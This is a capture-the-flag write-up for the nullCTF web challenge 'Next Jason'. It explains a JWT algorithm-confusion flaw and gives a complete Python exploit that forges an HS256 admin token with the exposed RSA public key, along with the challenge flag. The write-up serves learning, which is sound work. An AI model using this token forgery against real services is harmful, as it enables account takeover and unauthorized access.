#import "../../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Next Jason",
    description: "Exploit writeup for 'Next Jason', a web challenge from nullCTF",
    date: "2025-12-09",
    order: 15,
  ),
)<frontmatter>
= Next Jason Exploit Analysis
Download Challenge Files(soon)

== Vulnerability Analysis

The "Next Jason" application is vulnerable to a JWT (JSON Web Token) algorithm confusion attack. This vulnerability arises from the server's `/token/verify` endpoint accepting tokens signed with both `RS256` (asymmetric) and `HS256` (symmetric) algorithms. The public key used for `RS256` verification is also publicly exposed, which is critical for the exploit.

=== 1. JWT Algorithm Confusion

The `/app/token/verify/route.js` file contains the `verifyToken` function:

```javascript
function verifyToken(token) {
	return jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] });
}
```
This configuration allows the server to verify tokens signed with either `RS256` or `HS256`. `RS256` uses a private key for signing and a public key for verification, while `HS256` uses a single shared secret key for both.

=== 2. Public Key Exposure

The `/app/api/getPublicKey/route.js` endpoint exposes the `RS256` public key:

```javascript
import { NextResponse } from 'next/server';
import { readFileSync } from 'fs';
import path from 'path';

const PUBKEY = readFileSync(path.join(process.cwd(), 'public.pem'), 'utf8');

export async function GET(req) {
	try {
		return NextResponse.json({ PUBKEY });
	} catch (error) {
		console.error('Error retrieving public key:', error);
		return NextResponse.json({ error: 'Failed to retrieve public key' }, { status: 500 });
	}
}
```
An attacker can retrieve this public key.

=== 3. Admin Access Required for Flag

The `/app/api/getFlag/route.js` endpoint checks if the token's payload contains `username: 'admin'`:

```javascript
if (!payload.valid) return NextResponse.json({ error: 'Invalid token or token missing' }, { status: 403 });
if (payload.payload.username !== 'admin') return NextResponse.json({ error: 'You need to be admin!' }, { status: 403 });
```
The `/app/api/login/route.js` and `/app/token/sign/route.js` endpoints prevent users from directly logging in or signing tokens as 'admin'.

== The Exploitation Strategy

The exploit leverages the JWT algorithm confusion by using the publicly available `RS256` public key as the secret key for an `HS256` signed token.

=== Step 1: Obtain a Valid Token

First, we need to bypass the `middleware.js` to access API endpoints. The middleware checks for an `inviteCode` query parameter. We can obtain a valid, non-admin token by sending a POST request to `/token/sign` with a dummy username and the correct `inviteCode`.

```python
# Step 1: Get a token from /token/sign
print("[*] Getting a token from /token/sign...")
sign_payload = {"username": "testuser"}
try:
    sign_response = requests.post(f"{base_url}/token/sign?inviteCode={invite_code}", json=sign_payload)
    sign_response.raise_for_status()

    token = sign_response.json().get('token')
    if not token:
        print("[-] Failed to get token from /token/sign response.")
        return
    print(f"[+] Successfully obtained token: {token[:30]}...")
except requests.exceptions.RequestException as e:
    print(f"[-] Failed to get token from /token/sign: {e}")
    if e.response:
        print("[-] Server response:", e.response.text)
    return
```

=== Step 2: Fetch the Public Key

Using the token obtained in Step 1, we can now fetch the `RS256` public key from the `/api/getPublicKey` endpoint.

```python
# Step 2: Fetch the public key using the obtained token
print("[*] Fetching public key with valid token...")
cookies = {"token": token}
try:
    response = requests.get(f"{base_url}/api/getPublicKey", cookies=cookies)
    response.raise_for_status()
    public_key = response.json()['PUBKEY']
    print("[+] Public key received.")
except requests.exceptions.RequestException as e:
    print(f"[-] Failed to fetch public key: {e}")
    if e.response:
        print("[-] Server response:", e.response.text)
    return
```

=== Step 3: Forge an Admin Token

With the public key in hand, we can now forge an admin token. We construct a JWT header specifying `HS256` as the algorithm and a payload with `{"username": "admin"}`. We then sign this token using the retrieved public key as the symmetric secret. We manually construct the JWT to bypass `pyjwt`'s security checks that prevent using an asymmetric key for symmetric signing.

```python
# Step 3: Forge a malicious token
print("[*] Forging admin token...")
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin"}

encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

signing_input = encoded_header + b"." + encoded_payload
signature = hmac.new(public_key.encode(), signing_input, hashlib.sha256).digest()
encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b"=")

forged_token = (encoded_header + b"." + encoded_payload + b"." + encoded_signature).decode('utf-8')
print(f"[+] Forged token: {forged_token}")
```

=== Step 4: Retrieve the Flag

Finally, we send a GET request to the `/api/getFlag` endpoint, including the forged admin token in the cookies. The server will verify this token using the public key (as the `HS256` secret), validate it, and grant access to the flag.

```python
# Step 4: Get the flag
print("[*] Requesting flag with forged token...")
cookies = {"token": forged_token}
try:
    response = requests.get(f"{base_url}/api/getFlag", cookies=cookies)
    response.raise_for_status()
    flag = response.json().get('flag')
    if flag:
        print(f"[+] Success! Flag: {flag}")
    else:
        print("[-] Failed to get flag. Response:", response.json())
except requests.exceptions.RequestException as e:
    print(f"[-] Failed to get flag: {e}")
    if e.response:
        print("[-] Server response:", e.response.text)
```

== Full Exploit Code (exploit2.py)

```python
import requests
import base64
import json
import hmac
import hashlib

def exploit(url, invite_code):
    base_url = url.rstrip('/')

    # Step 1: Get a token from /token/sign
    print("[*] Getting a token from /token/sign...")
    sign_payload = {"username": "testuser"}
    try:
        sign_response = requests.post(f"{base_url}/token/sign?inviteCode={invite_code}", json=sign_payload)
        sign_response.raise_for_status()

        token = sign_response.json().get('token')
        if not token:
            print("[-] Failed to get token from /token/sign response.")
            return
        print(f"[+] Successfully obtained token: {token[:30]}...")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to get token from /token/sign: {e}")
        if e.response:
            print("[-] Server response:", e.response.text)
        return

    # Step 2: Fetch the public key using the obtained token
    print("[*] Fetching public key with valid token...")
    cookies = {"token": token}
    try:
        response = requests.get(f"{base_url}/api/getPublicKey", cookies=cookies)
        response.raise_for_status()
        public_key = response.json()['PUBKEY']
        print("[+] Public key received.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to fetch public key: {e}")
        if e.response:
            print("[-] Server response:", e.response.text)
        return

    # Step 3: Forge a malicious token
    print("[*] Forging admin token...")
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": "admin"}

    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

    signing_input = encoded_header + b"." + encoded_payload
    signature = hmac.new(public_key.encode(), signing_input, hashlib.sha256).digest()
    encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b"=")

    forged_token = (encoded_header + b"." + encoded_payload + b"." + encoded_signature).decode('utf-8')
    print(f"[+] Forged token: {forged_token}")

    # Step 4: Get the flag
    print("[*] Requesting flag with forged token...")
    cookies = {"token": forged_token}
    try:
        response = requests.get(f"{base_url}/api/getFlag", cookies=cookies)
        response.raise_for_status()
        flag = response.json().get('flag')
        if flag:
            print(f"[+] Success! Flag: {flag}")
        else:
            print("[-] Failed to get flag. Response:", response.json())
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to get flag: {e}")
        if e.response:
            print("[-] Server response:", e.response.text)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <URL>")
        print(f"Example: python3 {sys.argv[0]} http://localhost:3000")
        sys.exit(1)

    base_url = sys.argv[1]
    # The invite code is hardcoded in the Dockerfile
    invite_code = "secret_invite_code"
    exploit(base_url, invite_code)
```

= Flag
```
nullctf{f0rg3_7h15_cv3_h3h_706977ab8a0ddbaa}
```
